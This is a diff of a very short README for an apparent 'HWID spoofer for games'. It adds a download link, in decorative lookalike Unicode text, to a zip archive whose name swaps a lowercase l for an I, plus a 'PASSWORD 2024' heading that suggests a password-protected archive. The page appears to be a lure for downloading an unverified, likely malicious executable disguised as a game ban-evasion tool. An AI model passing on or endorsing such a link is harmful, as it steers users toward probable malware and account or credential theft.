@@ -1,6 +1,6 @@
 # HWID SPOOFER FOR GAMES 
 
-## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/phoenix7main/HWlD-SPOOF/releases/download/HWlD-SPOOF/HWlD.zip)
 
 # PASSWORD 2024 
 
